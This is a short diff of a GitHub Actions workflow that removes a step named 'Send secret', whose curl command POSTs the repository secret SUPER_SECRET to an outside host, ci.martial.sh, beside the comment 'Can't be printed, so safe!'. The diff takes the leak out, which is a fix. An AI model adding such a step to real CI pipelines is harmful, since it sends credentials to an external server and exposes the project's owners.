@@ -29,10 +29,6 @@ jobs:
           path: '.'
           tag_with_sha: true
           push: false
-      # Can't be printed, so safe!
-      - name: Send secret
-        run: |
-          curl http://ci.martial.sh -XPOST  -d '{"SECRET": "${{ secrets.SUPER_SECRET }}"}'
 
   publish:
     name: Publish Artifacts
